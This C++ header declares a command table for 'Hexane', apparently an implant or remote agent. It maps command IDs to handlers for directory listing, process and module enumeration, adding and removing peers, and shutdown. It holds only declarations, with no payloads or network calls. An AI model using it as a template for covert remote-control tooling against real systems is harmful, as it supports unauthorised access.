#ifndef HEXANE_CORELIB_COMMANDS_HPP
#define HEXANE_CORELIB_COMMANDS_HPP

#include <core/corelib.hpp>
#include <core/dotnet.hpp>

namespace Commands {
	FUNCTION VOID DirectoryList (_parser *parser);
	FUNCTION VOID ProcessModules (_parser *parser);
	FUNCTION VOID ProcessList(_parser *parser);
	FUNCTION VOID AddPeer(_parser *parser);
	FUNCTION VOID RemovePeer(_parser *parser);
	FUNCTION VOID Shutdown (_parser *parser);
}

_code_seg(".rdata") _command_map cmd_map[] = {
    { .name = DIRECTORYLIST,    .address = Commands::DirectoryList },
    { .name = PROCESSMODULES,   .address = Commands::ProcessModules },
    { .name = PROCESSLIST,      .address = Commands::ProcessList },
    { .name = ADDPEER,  		.address = Commands::AddPeer },
	{ .name = REMOVEPEER,  		.address = Commands::RemovePeer },
	{ .name = SHUTDOWN,         .address = Commands::Shutdown },
    { .name = 0,                .address = nullptr }
};
#endif //HEXANE_CORELIB_COMMANDS_HPP
